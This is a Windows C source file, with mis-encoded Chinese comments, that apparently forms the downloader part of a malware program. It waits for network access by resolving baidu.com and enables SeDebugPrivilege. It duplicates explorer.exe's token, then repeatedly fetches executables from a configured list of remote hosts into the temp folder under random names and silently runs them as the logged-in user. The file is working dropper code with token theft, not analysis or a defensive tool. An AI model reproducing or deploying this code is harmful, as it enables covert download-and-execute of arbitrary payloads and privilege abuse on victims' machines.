////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "Common.h"

//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	char	g_szTempPath[MAX_PATH];
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
DWORD	GetRandomVal();
DWORD	ProcessEnumAndOperate(char *pInBuffer, DWORD dwBufferSize, DWORD dwFlag);
//--------------------------------------------------------------------------//

//Accept-Encoding: gzip, deflate\r\n	//��Ҫ���������, ���߷�����,�������κα���(ѹ��)����
char	g_szHttpHeadPart[] = "HTTP/1.1\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n";
char	g_szBaidu[] = "www.baidu.com";

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//����Ƿ��Ѿ�����, ���������, �ȴ����
BOOL CheckCntOrWait(DWORD dwTimeOut)
{
	DWORD		dwTimeBegin;
	WSADATA		wsadata;


	WSAStartup(MAKEWORD(2, 2), &wsadata);
	dwTimeBegin = GetTickCount();
	while(gethostbyname( g_szBaidu ) == NULL)
	{
		if(dwTimeOut != INFINITE)
		{
			if( (GetTickCount() - dwTimeBegin) >= dwTimeOut)
			{
				return FALSE;
			}
		}

		Sleep( 1000 );
	}

	WSACleanup();

	return TRUE;
}

//��ȡIP��ַ, ������������������������
BOOL GetTheIP(IN_ADDR *pInAddr, char *szName, DWORD dwLanOrInNet)
{
	char	szHostName[64], *pHostName = NULL;
	int		iStatus = TRUE;
	hostent	*pHost = NULL;
	WSADATA	wsadata;


	WSAStartup(MAKEWORD(2, 2), &wsadata);

	pHostName = szName;
	if(pHostName == NULL)
	{
		memset(szHostName, 0, 64);
		gethostname(szHostName, 64);//��ȡ���ؼ��������

		pHostName = szHostName;
	}

	pHost = gethostbyname( pHostName );
	if( pHost == NULL )
	{
		iStatus = FALSE;
		goto __END;
	}

	memset(pInAddr, 0, sizeof(IN_ADDR));//ע��,������� pInaddr ��0
	for(int i = 0; pHost->h_addr_list[i] != NULL; i++)
	{
		int ib1 = ((PIN_ADDR)(pHost->h_addr_list[i]))->S_un.S_un_b.s_b1;
		int ib2 = ((PIN_ADDR)(pHost->h_addr_list[i]))->S_un.S_un_b.s_b2;

		if(dwLanOrInNet == 1)//Ҫ��ȡ������IP
		{
			if( ib1 == 192 && ib2 == 168 || 
				ib1 == 169 && ib2 == 254 ||
				ib1 == 172 && ib2 == 16  ||
				ib1 == 10  || ib1 == 127 )
			{
				memcpy(pInAddr, pHost->h_addr_list[i], 4);
				break;
			}
		}

		if(dwLanOrInNet == 2)//Ҫ��ȡInternet IP
		{
			if( (ib1 != 192 && ib2 != 168) && 
				(ib1 != 169 && ib2 != 254) &&
				(ib1 != 172 && ib2 != 16 ) &&
				(ib1 != 10 )&&(ib1 != 127) )
			{
				memcpy(pInAddr, pHost->h_addr_list[i], 4);
				break;
			}
		}
	}

__END:
	if(pInAddr->S_un.S_addr == 0x00000000 || pInAddr->S_un.S_addr == 0xFFFFFFFF)//û���õ�IP��ַ
	{
		iStatus = FALSE;
	}

	WSACleanup();

	return iStatus;
}

//�ҵ����� "Location: /YNNWN/11.rar" �������ַ���
BOOL FoundNewPath(char *szSrcInfo, char *szNewPath)
{
	char	*pMove = NULL;


	if(strstr(szSrcInfo, "302 Found") == NULL)
	{
		return FALSE;
	}
	
	pMove = strstr(szSrcInfo, "Location: ");
	if(pMove == NULL)
	{
		return FALSE;
	}

	lstrcpy(szNewPath, pMove + 11);

	pMove = strstr(szNewPath, "\r\n\r\n");
	if(pMove == NULL)
	{
		return FALSE;
	}

	*(DWORD*)pMove = 0x00000000;

	return TRUE;
}

//���HTTPͷ, ��ȡ��Դ��С
DWORD RequestFileSize(char *szHttpInfo)
{
	DWORD	dwFileSize = 0;
	char	*pFound = NULL, *pMove = NULL, szSize[64];


	pFound = strstr(szHttpInfo, "Content-Length: ");
	if(pFound == NULL)
	{
		goto __END;
	}
	pFound = pFound + 16;
	pMove = strstr(pFound, "\r\n");

	memset(szSize, 0, sizeof(szSize));
	memcpy(szSize, pFound, (pMove - pFound + 1));

	dwFileSize = (DWORD)atoi( szSize );

__END:
	return dwFileSize;
}

//Winsocket, HTTP����
DWORD SocketDownLoad(char *szHost, DWORD dwPort, char *szNetPath, char *szLocalSavePath, char *szCurrentDN)
{
	int			iBufLen = 0, iRet = 0, iDataLen = 0;
	char		szFormat[512], szHTTPRequest[1024], cRevBuf[2048], szNewPath[512], *pDataBegin = NULL;
	DWORD		dwResult = 0, dwSendCount = 0, dwFileSize = 0, dwByte = 0, dwTotalWrite = 0;
	WSADATA		wsadata;
	SOCKET		sCurSock = INVALID_SOCKET;
	sockaddr_in	addrDest;
	WSAEVENT	hEvent = NULL;
	HANDLE		hFile = INVALID_HANDLE_VALUE;


	WSAStartup(MAKEWORD(2, 2), &wsadata);

	addrDest.sin_family				= AF_INET;
	addrDest.sin_port				= htons( (USHORT)dwPort );
	addrDest.sin_addr.S_un.S_addr	= inet_addr( szHost );
	if(addrDest.sin_addr.S_un.S_addr == 0xFFFFFFFF)
	{
		GetTheIP(&addrDest.sin_addr, szHost, 2);
	}

	sCurSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if( connect(sCurSock, (sockaddr*)&addrDest, sizeof(addrDest)) != 0 )
	{
		dwResult = 2;
		goto __END;
	}

	//�����ȴ��¼�
	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	WSAEventSelect(sCurSock, hEvent, FD_READ);//ֻ���Ŀɶ��¼�

	//���ý��ճ�ʱ
	dwByte = 10000;//10��
	setsockopt(sCurSock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&dwByte, sizeof(dwByte));

	//����HTTP����
	memset(szFormat, 0, sizeof(szFormat));
	wsprintf(szFormat, "%s%s", "GET /%s ", g_szHttpHeadPart);
	memset(szHTTPRequest, 0, sizeof(szHTTPRequest));
	wsprintf(szHTTPRequest, szFormat, szNetPath, szCurrentDN);
	iBufLen = lstrlen( szHTTPRequest );

	//��������
	for(;;)
	{
		iRet = send(sCurSock, &szHTTPRequest[dwSendCount], iBufLen, 0);
		dwSendCount = dwSendCount + iRet;
		iBufLen = iBufLen - iRet;
		if(iBufLen <= 0)//�ѷ������
		{
			break;
		}
		if(iRet == 0 || iRet == SOCKET_ERROR)
		{
			dwResult = 3;
			goto __END;
		}
	}

	//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>���HTTPͷ>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	DWORD	dwRecvCount = 0;

__RECVAGAIN:
	//��һ�ν�������, ���HTTPͷ, ��ѯ�ļ�����
	if( WaitForSingleObject(hEvent, 10000) == WAIT_TIMEOUT)	//10�볬ʱ
	{
		dwResult = 4;
		goto __END;
	}

	//ע��,�Ҳ����������¼��Ĵ������
	memset(cRevBuf, 0, sizeof(cRevBuf));
	iRet = recv(sCurSock, cRevBuf, sizeof(cRevBuf), 0);
	dwRecvCount ++;
	if(iRet == 0 || iRet == SOCKET_ERROR)
	{
		dwResult = 5;
		goto __END;
	}

	if(dwRecvCount == 1)
	{
		if(strstr(cRevBuf, "200 OK") == NULL)
		{
			dwResult = 6;

			if(FoundNewPath(cRevBuf, szNewPath) == TRUE)
			{
				dwResult = 12;
			}
			
			goto __END;
		}
	}

	if( (dwFileSize = RequestFileSize( cRevBuf )) == 0)	//�ļ���С
	{
		if(dwRecvCount == 1)
		{
			goto __RECVAGAIN;
		}
		dwResult = 7;
		goto __END;
	}
	//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

	pDataBegin = strstr(cRevBuf, "\r\n\r\n") + 4;	//�ļ���ʼ
	if((DWORD)pDataBegin == 4)
	{
		dwResult = 8;
		goto __END;
	}
	iDataLen = iRet - (pDataBegin - cRevBuf);				//�˴����ݴ�С

	//�����ļ�
	hFile = CreateFile(szLocalSavePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		dwResult = 9;
		goto __END;
	}
	WriteFile(hFile, pDataBegin, iDataLen, &dwByte, NULL);	//ע��, д����������Ϊ 2KB, ������������, ��������Ϊ, ��WriteFile����ʱ, һ��д��������
	dwTotalWrite = dwTotalWrite + iDataLen;					//����, ������Ϊ iDataLen ����д��ĳ���, ������ dwByte
	if(dwTotalWrite == dwFileSize)
	{
		dwResult = 1;	//�������
		goto __END;
	}

	//ѭ����������
	for(;;)
	{
		if(WaitForSingleObject(hEvent, 10000) == WAIT_TIMEOUT)
		{
			dwResult = 10;
			goto __END;
		}
		iRet = recv(sCurSock, cRevBuf, sizeof(cRevBuf), 0);
		if(iRet == 0 || iRet == SOCKET_ERROR)
		{
			dwResult = 11;
			goto __END;
		}

		WriteFile(hFile, cRevBuf, iRet, &dwByte, NULL);
		dwTotalWrite = dwTotalWrite + iRet;
		if(dwTotalWrite == dwFileSize)
		{
			dwResult = 1;	//�������
			goto __END;
		}
	}

__END:
	if(sCurSock != INVALID_SOCKET)
	{
		shutdown( sCurSock, SD_BOTH);
		closesocket( sCurSock );
	}
	WSACleanup();

	if(hEvent != NULL)
	{
		CloseHandle( hEvent );
	}

	if(hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle( hFile );
	}

	if(dwResult != 1)	//ֻ�����سɹ�, dwResult ������Ϊ 1
	{
		if(szLocalSavePath != NULL)
		{
			DeleteFile( szLocalSavePath );
		}
	}

	if(dwResult == 12)
	{
		dwResult = SocketDownLoad(szHost, dwPort, szNewPath/*ע��*/, szLocalSavePath, szCurrentDN);
	}

	return dwResult;
}

//���г���
BOOL RunExe(char *szFilePath, HANDLE hToken)
{
	BOOL	bStatus = FALSE;

	if(hToken != NULL)
	{
		BOOL				bStatus;
		STARTUPINFO			si;
		PROCESS_INFORMATION	pi;
		LPVOID				pEnv = NULL;


		memset(&si, 0, sizeof(si));
		memset(&pi, 0, sizeof(pi));
		si.cb = sizeof(si);
		si.lpDesktop = "winsta0\\default";
		CreateEnvironmentBlock(&pEnv, hToken, FALSE);
		bStatus = CreateProcessAsUser(hToken, szFilePath, NULL, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE|CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi);
		DestroyEnvironmentBlock( pEnv );
		if(bStatus == TRUE)
		{
			CloseHandle( pi.hThread );
			CloseHandle( pi.hProcess );
		}
	}
	else
	{
		if( WinExec(szFilePath, SW_SHOW) > 31 )
		{
			bStatus = TRUE;
		}
	}

	return bStatus;
}

//��ȡĳ�����̵�Token
HANDLE GetProcessToken(char *szProcessName)
{
	HANDLE	hSrcToken = NULL, hNewToKen = NULL;
	DWORD	dwProcessID = 0;


	//��ȡToken, �Ա�RunAs
	dwProcessID = ProcessEnumAndOperate(szProcessName, 0, 4);
	if(dwProcessID != 0)
	{
		HANDLE hProcess = NULL;
		
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if ( hProcess == NULL )
		{
			char	szMsg[100];
			wsprintf(szMsg, "GetProcessToken  000  ... %lx, %lx. %lx..", dwProcessID, hSrcToken, GetLastError() );
			WriteLog(szMsg, 0);

		}
		OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hSrcToken);
		{
			char	szMsg[100];
			wsprintf(szMsg, "GetProcessToken  222  ... %lx, %lx. %lx..", dwProcessID, hSrcToken, GetLastError() );
			WriteLog(szMsg, 0);

		}
		CloseHandle( hProcess );
	}
	else
	{
		char	szMsg[100];
		wsprintf(szMsg, "GetProcessToken    ... %lx, %lx. %lx..", dwProcessID, hSrcToken, GetLastError() );
		WriteLog(szMsg, 0);

	}



	//����Token
	if(hSrcToken != NULL)
	{
		DuplicateTokenEx(hSrcToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewToKen);
		CloseHandle( hSrcToken );
	}

	return hNewToKen;
}

//�����ļ�ִ��
DWORD WINAPI DownLoad(LPVOID lpParameter)
{
	UNUSEPARAM	lpParameter;
	char		szSavePath[MAX_PATH], szNetPath[MAX_PATH], *pCurDN = NULL, *pTargetPath = NULL, *pCurItem = NULL;
	DWORD		dwPort = 0;
	HANDLE		hToken = NULL;

	char	szMsg[100];
	wsprintf(szMsg, "����Ƿ��Ѿ�����..." );
	WriteLog(szMsg, 0);


	//����Ƿ��Ѿ�����
//	MessageBox( NULL, "1", "a", 0 );
	CheckCntOrWait( INFINITE );
//	MessageBox( NULL, "2", "a", 0 );
	wsprintf(szMsg, "����Ƿ��Ѿ�����  ���..." );
	WriteLog(szMsg, 0);

	//��ʼ����
	pCurDN = g_pGlobalParameter->DOWNINFO.szDNList;
	pTargetPath = g_pGlobalParameter->DOWNINFO.szPath;
	pCurItem = g_pGlobalParameter->DOWNINFO.szItem;
	dwPort = g_pGlobalParameter->DOWNINFO.dwPort;
	do
	{
		WriteLog("  ��ʼ������ǰ����Ȩ�ޣ�  ", 0);
		TOKEN_PRIVILEGES tkp;
		HANDLE hToken1 = NULL; 
		if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken1)) 
		{
			wsprintf(szMsg, "�򿪵�ǰ����ʧ��   %lx...", GetLastError() ); 
			WriteLog(szMsg, 0);
		}
		LookupPrivilegeValue(NULL, "SeDebugPrivilege",&tkp.Privileges[0].Luid); //��ñ��ػ�Ψһ�ı�ʶ ����
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
		AdjustTokenPrivileges(hToken1, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES) NULL, 0); //������õ�Ȩ�� ����
		if (GetLastError() != ERROR_SUCCESS)
		{
			wsprintf(szMsg, "����Ȩ��ʧ��   %lx...", GetLastError() );
			WriteLog(szMsg, 0);
		}
	}while( 0 );

	//ִ���ļ���Ҫ���Token
	DWORD	a = 0;
	for ( a=0; a<30; a++ )
	{
		hToken = GetProcessToken( "explorer.exe" );
		if ( hToken ) break;
		Sleep( 1000*5);
	}

	while(*pCurItem != '\x00')
	{

		if(*pCurDN == '\x00')
		{
			pCurDN = g_pGlobalParameter->DOWNINFO.szDNList;
		}
		while(*pCurDN != '\x00')
		{
			DWORD	dwDownResult;

			wsprintf(szMsg, "����  1111 ..." );
			WriteLog(szMsg, 0);

			wsprintf(szSavePath, "%s%.8x.exe", g_szTempPath, GetRandomVal());
			wsprintf(szNetPath, "%s/%s", pTargetPath, pCurItem);

			WriteLog( szSavePath, 0 );
			WriteLog( szNetPath, 0 );
			

			do
			{
				dwDownResult = SocketDownLoad(pCurDN, dwPort, szNetPath, szSavePath, pCurDN);
				if ( dwDownResult != 2) break;
				Sleep( 1000 * 5 );
			}while( 1 );

			wsprintf(szMsg, "����  222������%lx ...", dwDownResult );
			WriteLog(szMsg, 0);

			if(dwDownResult == 1)
			{
				wsprintf(szMsg, "ִ���ļ�... token:%lx", hToken );
				WriteLog(szMsg, 0);

				

				//ִ���ļ�
				RunExe(szSavePath, hToken);
				break;
			}
			else if(dwDownResult == 6)	//����ļ�������
			{
				wsprintf(szMsg, "�ļ�������..." );
				WriteLog(szMsg, 0);

				break;
			}

			Sleep( 1000 * 5 );
			pCurDN = pCurDN + lstrlen( pCurDN ) + 1;
		}

		Sleep( 1000 * 2 );
		pCurItem = pCurItem + lstrlen( pCurItem ) + 1;
	}
	wsprintf(szMsg, "����  ���..." );
	WriteLog(szMsg, 0);

//	MessageBox( NULL, "3", "a", 0 );

	//����
	if(hToken != NULL)
	{
		CloseHandle( hToken );
	}

	return 0;
}